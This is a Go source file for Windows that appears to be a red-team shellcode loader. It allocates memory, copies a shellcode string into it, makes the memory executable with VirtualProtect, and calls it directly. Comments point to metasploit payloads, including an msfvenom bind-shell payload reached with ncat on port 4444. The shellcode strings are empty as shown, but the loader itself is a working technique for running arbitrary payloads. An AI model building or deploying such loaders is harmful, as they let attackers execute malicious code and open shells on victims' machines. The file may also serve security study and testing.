// +build 386

package main

import (
	"syscall"
	"unsafe"

	"github.com/riftbit/w32"
)

// metasploit spawn notepad for x64
var shellcode string = ""

// msfvenom --payload windows/x64/shell_bind_tcp
// Connect with ncat.exe 127.0.0.1 4444
//var shellcode string = ""

func main() {

	// Marking as PAGE_READWRITE only so that we can demo VirtualProtect
	addr, err := w32.VirtualAlloc(0, len(shellcode), w32.MEM_RESERVE|w32.MEM_COMMIT, w32.PAGE_READWRITE)
	if err != nil {
		panic(err)
	}

	// Write the shellcode into the allocated memory
	buf := (*[890000]byte)(unsafe.Pointer(addr))
	for x, value := range []byte(shellcode) {
		buf[x] = value
	}

	var mbi w32.MEMORY_BASIC_INFORMATION
	w32.VirtualQuery(addr, &mbi, len(shellcode))
	// Modify the permissions of the memory so that we can execute it.
	w32.VirtualProtect(addr, len(shellcode), w32.PAGE_EXECUTE_READ, &mbi.Protect)

	syscall.Syscall(addr, 0, 0, 0, 0)
}
